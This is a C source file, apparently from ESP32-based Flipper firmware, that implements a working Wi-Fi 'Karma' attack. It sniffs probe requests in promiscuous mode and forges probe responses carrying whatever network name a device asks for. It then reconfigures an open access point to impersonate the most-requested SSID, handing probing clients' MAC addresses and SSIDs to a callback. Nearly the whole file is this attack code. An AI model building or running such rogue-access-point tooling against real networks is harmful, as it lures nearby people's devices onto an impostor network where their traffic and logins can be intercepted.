#include "wlan_karma.h"
#include "wlan_hal.h"

#include <string.h>
#include <stdlib.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_log.h>
#include <esp_heap_caps.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <lwip/ip4_addr.h>
#include <furi.h>
#include <btshim.h>

#define TAG "WlanKarma"

#define KARMA_MAX_SSIDS 32
#define KARMA_STALE_MS 300000
#define KARMA_ROTATE_MS 5000
#define KARMA_TASK_STACK 3072

typedef struct {
    char ssid[33];
    uint32_t hits;
    uint32_t last_seen;
} KarmaSsidEntry;

static volatile bool s_running = false;
static volatile bool s_task_run = false;
static TaskHandle_t s_karma_task = NULL;
static KarmaSsidEntry s_ssids[KARMA_MAX_SSIDS];
static uint16_t s_ssid_count = 0;
static volatile uint32_t s_probe_reqs = 0;
static volatile uint32_t s_probe_resps = 0;
static volatile uint16_t s_connected = 0;
static char s_current_ssid[33] = {0};
static char s_latest_probe_ssid[33] = {0};
static uint8_t s_channel = 1;
static uint8_t s_ap_mac[6] = {0};
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static bool s_netif_created = false;
static bool s_events_registered = false;
static esp_netif_t* s_ap_netif = NULL;
static WlanKarmaCredCb s_cred_cb = NULL;
static void* s_cred_ctx = NULL;
static bool s_bt_was_on = false;

// Probe Response template (fixed portion up to tagged params)
// FC(2) + Duration(2) + DA(6) + SA(6) + BSSID(6) + Seq(2) = 24 bytes
// + Timestamp(8) + BeaconInterval(2) + Capability(2) = 12 bytes
// = 36 bytes fixed header before tagged params
#define PROBE_RESP_HDR_LEN 36
#define PROBE_RESP_MAX_LEN 128

static void karma_event_handler(void* arg, esp_event_base_t base, int32_t id, void* data) {
    (void)arg;
    if(base == WIFI_EVENT) {
        if(id == WIFI_EVENT_AP_STACONNECTED) {
            s_connected++;
        } else if(id == WIFI_EVENT_AP_STADISCONNECTED) {
            if(s_connected > 0) s_connected--;
        }
    }
}

static void karma_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT || !s_running) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* fr = p->payload;
    int len = p->rx_ctrl.sig_len;
    if(len < 26) return;
    // Frame Control: Type=Mgmt(0) Subtype=ProbeReq(4) -> byte0 == 0x40
    if((fr[0] & 0xFC) != 0x40) return;
    // Tagged params start at offset 24, SSID = Element-ID 0
    if(fr[24] != 0) return;
    uint8_t slen = fr[25];
    if(slen == 0 || slen > 32) return;
    if(26 + slen > len) return;

    char ssid[33];
    memcpy(ssid, &fr[26], slen);
    ssid[slen] = 0;

    uint8_t client_mac[6];
    memcpy(client_mac, &fr[10], 6); // SA = transmitter MAC

    s_probe_reqs++;

    strncpy(s_latest_probe_ssid, ssid, sizeof(s_latest_probe_ssid) - 1);
    s_latest_probe_ssid[sizeof(s_latest_probe_ssid) - 1] = 0;

    uint32_t now = esp_log_timestamp();
    portENTER_CRITICAL(&s_mux);
    int found = -1, weakest = 0;
    for(int i = 0; i < (int)s_ssid_count; i++) {
        if(strcmp(s_ssids[i].ssid, ssid) == 0) {
            found = i;
            break;
        }
        if(s_ssids[i].hits < s_ssids[weakest].hits) weakest = i;
    }
    if(found >= 0) {
        if(s_ssids[found].hits < 0xFFFF) s_ssids[found].hits++;
        s_ssids[found].last_seen = now;
    } else if(s_ssid_count < KARMA_MAX_SSIDS) {
        KarmaSsidEntry* e = &s_ssids[s_ssid_count++];
        strncpy(e->ssid, ssid, sizeof(e->ssid) - 1);
        e->ssid[sizeof(e->ssid) - 1] = 0;
        e->hits = 1;
        e->last_seen = now;
    } else {
        KarmaSsidEntry* e = &s_ssids[weakest];
        strncpy(e->ssid, ssid, sizeof(e->ssid) - 1);
        e->ssid[sizeof(e->ssid) - 1] = 0;
        e->hits = 1;
        e->last_seen = now;
    }
    portEXIT_CRITICAL(&s_mux);

    if(s_cred_cb) s_cred_cb(ssid, client_mac, s_cred_ctx);

    // Build probe response and send it
    uint8_t resp[PROBE_RESP_MAX_LEN];
    memset(resp, 0, PROBE_RESP_HDR_LEN);
    resp[0] = 0x50; // FC: Mgmt, Probe Response
    resp[1] = 0x00;
    // Duration: 0 (will be filled by HW)
    memcpy(&resp[4], client_mac, 6);  // DA = client
    memcpy(&resp[10], s_ap_mac, 6);   // SA = our AP MAC
    memcpy(&resp[16], s_ap_mac, 6);   // BSSID = our AP MAC
    // Seq Ctl: 0 (filled by HW with en_sys_seq=true)
    // Timestamp: 8 bytes, keep 0
    // Beacon Interval: 100 TU
    resp[36] = 0x64;
    resp[37] = 0x00;
    // Capability: ESS (bit0), Privacy=0 -> 0x01 0x00
    resp[38] = 0x01;
    resp[39] = 0x00;

    int off = PROBE_RESP_HDR_LEN;
    // SSID IE
    resp[off++] = 0x00;
    resp[off++] = slen;
    memcpy(&resp[off], &fr[26], slen);
    off += slen;
    // Supported Rates IE
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    resp[off++] = 0x01;
    resp[off++] = sizeof(rates);
    memcpy(&resp[off], rates, sizeof(rates));
    off += sizeof(rates);
    // DS Parameter Set (channel)
    resp[off++] = 0x03;
    resp[off++] = 0x01;
    resp[off++] = s_channel;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, resp, off, true);
    if(err == ESP_OK) {
        s_probe_resps++;
    }
}

static void karma_apply_ssid(const char* ssid) {
    wifi_config_t ap_cfg = {0};
    strncpy((char*)ap_cfg.ap.ssid, ssid, 32);
    ap_cfg.ap.ssid_len = strlen(ssid);
    ap_cfg.ap.channel = s_channel;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.beacon_interval = 100;
    esp_err_t err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if(err == ESP_OK) {
        strncpy(s_current_ssid, ssid, sizeof(s_current_ssid) - 1);
        s_current_ssid[sizeof(s_current_ssid) - 1] = 0;
        ESP_LOGI(TAG, "AP SSID -> '%s'", ssid);
    } else {
        ESP_LOGW(TAG, "set_config: %s", esp_err_to_name(err));
    }
}

static void karma_task(void* param) {
    (void)param;
    ESP_LOGI(TAG, "task start");
    while(s_task_run) {
        for(int i = 0; i < KARMA_ROTATE_MS / 100 && s_task_run; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        if(!s_task_run) break;

        wifi_sta_list_t sl;
        if(esp_wifi_ap_get_sta_list(&sl) == ESP_OK && sl.num > 0) continue;

        uint32_t now = esp_log_timestamp();
        char best[33] = {0};
        uint16_t best_hits = 0;
        portENTER_CRITICAL(&s_mux);
        for(int i = 0; i < (int)s_ssid_count; i++) {
            if(now - s_ssids[i].last_seen > KARMA_STALE_MS) continue;
            if(s_ssids[i].hits > best_hits) {
                best_hits = s_ssids[i].hits;
                strncpy(best, s_ssids[i].ssid, sizeof(best) - 1);
                best[sizeof(best) - 1] = 0;
            }
        }
        portEXIT_CRITICAL(&s_mux);

        if(best[0] && strcmp(best, s_current_ssid) != 0) {
            karma_apply_ssid(best);
        }
    }
    ESP_LOGI(TAG, "task stop");
    s_karma_task = NULL;
    vTaskDelete(NULL);
}

typedef struct {
    uint8_t channel;
    WlanKarmaCredCb cred_cb;
    void* cred_ctx;
    bool result;
} KarmaStartArgs;

static void karma_start_worker(void* arg) {
    KarmaStartArgs* a = arg;
    a->result = false;

    static bool netif_once = false;
    if(!netif_once) {
        esp_netif_init();
        esp_event_loop_create_default();
        netif_once = true;
    }

    if(!s_ap_netif) {
        s_ap_netif = esp_netif_create_default_wifi_ap();
        if(!s_ap_netif) {
            ESP_LOGE(TAG, "AP netif FAILED");
            return;
        }
        esp_netif_dhcps_stop(s_ap_netif);
        esp_netif_ip_info_t ip = {0};
        IP4_ADDR(&ip.ip, 172, 0, 0, 1);
        IP4_ADDR(&ip.gw, 172, 0, 0, 1);
        IP4_ADDR(&ip.netmask, 255, 255, 255, 0);
        esp_netif_set_ip_info(s_ap_netif, &ip);
        s_netif_created = true;
    }

    wifi_init_config_t wcfg = WIFI_INIT_CONFIG_DEFAULT();
    wcfg.static_rx_buf_num = 2;
    wcfg.dynamic_rx_buf_num = 4;
    wcfg.dynamic_tx_buf_num = 8;
    esp_err_t err = esp_wifi_init(&wcfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "wifi_init: %s", esp_err_to_name(err));
        return;
    }
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    wifi_config_t ap_cfg = {0};
    const char* base_ssid = "KarmaAP";
    strncpy((char*)ap_cfg.ap.ssid, base_ssid, 32);
    ap_cfg.ap.ssid_len = strlen(base_ssid);
    ap_cfg.ap.channel = a->channel;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.beacon_interval = 100;

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "set_mode: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "set_config: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    if(!s_events_registered) {
        esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, karma_event_handler, NULL);
        s_events_registered = true;
    }

    err = esp_wifi_start();
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "wifi_start: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    vTaskDelay(pdMS_TO_TICKS(200));

    esp_wifi_get_mac(WIFI_IF_AP, s_ap_mac);
    ESP_LOGI(TAG, "AP MAC: %02x:%02x:%02x:%02x:%02x:%02x",
             s_ap_mac[0], s_ap_mac[1], s_ap_mac[2],
             s_ap_mac[3], s_ap_mac[4], s_ap_mac[5]);

    s_channel = a->channel;
    strncpy(s_current_ssid, base_ssid, sizeof(s_current_ssid) - 1);
    s_current_ssid[sizeof(s_current_ssid) - 1] = 0;
    s_ssid_count = 0;
    s_probe_reqs = 0;
    s_probe_resps = 0;
    s_connected = 0;

    wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
    esp_wifi_set_promiscuous(true);

    s_running = true;
    s_task_run = true;
    static StaticTask_t ktcb;
    size_t st = KARMA_TASK_STACK;
    StackType_t* stack = heap_caps_malloc(st, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    if(!stack) stack = heap_caps_malloc(st, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if(stack) {
        s_karma_task = xTaskCreateStatic(karma_task, "KarmaAttk", st, NULL, 4, stack, &ktcb);
    }
    if(!s_karma_task) {
        ESP_LOGE(TAG, "task create FAILED");
        s_running = false;
        s_task_run = false;
        esp_wifi_set_promiscuous(false);
    }

    a->result = true;
    ESP_LOGI(TAG, "Karma Attack ACTIVE Ch=%u", a->channel);
}

bool wlan_karma_start(uint8_t channel, WlanKarmaCredCb cred_cb, void* ctx) {
    if(s_running) {
        ESP_LOGW(TAG, "already running");
        return false;
    }

    wlan_hal_ensure_worker();

    if(wlan_hal_is_started()) {
        ESP_LOGI(TAG, "stopping STA mode first");
        wlan_hal_stop();
    }

    Bt* bt = furi_record_open(RECORD_BT);
    s_bt_was_on = bt_is_enabled(bt);
    if(s_bt_was_on) {
        bt_stop_stack(bt);
    }
    furi_record_close(RECORD_BT);

    s_cred_cb = cred_cb;
    s_cred_ctx = ctx;

    KarmaStartArgs a = {.channel = channel ? channel : 1, .cred_cb = cred_cb, .cred_ctx = ctx, .result = false};
    if(!wlan_hal_run_in_worker(karma_start_worker, &a)) {
        ESP_LOGE(TAG, "worker dispatch failed");
        if(s_bt_was_on) {
            Bt* bt2 = furi_record_open(RECORD_BT);
            bt_start_stack(bt2);
            furi_record_close(RECORD_BT);
            s_bt_was_on = false;
        }
        return false;
    }
    if(!a.result && s_bt_was_on) {
        Bt* bt2 = furi_record_open(RECORD_BT);
        bt_start_stack(bt2);
        furi_record_close(RECORD_BT);
        s_bt_was_on = false;
    }
    return a.result;
}

static void karma_stop_worker(void* arg) {
    (void)arg;
    ESP_LOGI(TAG, "stopping");

    s_task_run = false;
    while(s_karma_task) vTaskDelay(pdMS_TO_TICKS(10));

    s_running = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    esp_wifi_stop();
    esp_wifi_deinit();

    s_connected = 0;
    s_current_ssid[0] = 0;
    s_ssid_count = 0;

    ESP_LOGI(TAG, "stopped");
}

void wlan_karma_stop(void) {
    if(!s_running) return;
    wlan_hal_run_in_worker(karma_stop_worker, NULL);

    if(s_bt_was_on) {
        Bt* bt = furi_record_open(RECORD_BT);
        bt_start_stack(bt);
        furi_record_close(RECORD_BT);
        s_bt_was_on = false;
    }
}

bool wlan_karma_is_running(void) {
    return s_running;
}

uint32_t wlan_karma_get_probe_reqs(void) {
    return s_probe_reqs;
}

uint32_t wlan_karma_get_probe_resps(void) {
    return s_probe_resps;
}

uint16_t wlan_karma_get_ssid_count(void) {
    uint16_t c;
    portENTER_CRITICAL(&s_mux);
    c = s_ssid_count;
    portEXIT_CRITICAL(&s_mux);
    return c;
}

uint16_t wlan_karma_get_clients(void) {
    return s_connected;
}

bool wlan_karma_get_current_ssid(char* out, size_t out_size) {
    if(!out || out_size == 0) return false;
    if(!s_running || !s_current_ssid[0]) {
        out[0] = 0;
        return false;
    }
    strncpy(out, s_current_ssid, out_size - 1);
    out[out_size - 1] = 0;
    return true;
}

bool wlan_karma_get_latest_probe_ssid(char* out, size_t out_size) {
    if(!out || out_size == 0) return false;
    portENTER_CRITICAL(&s_mux);
    strncpy(out, s_latest_probe_ssid, out_size - 1);
    out[out_size - 1] = 0;
    portEXIT_CRITICAL(&s_mux);
    return out[0] != 0;
}
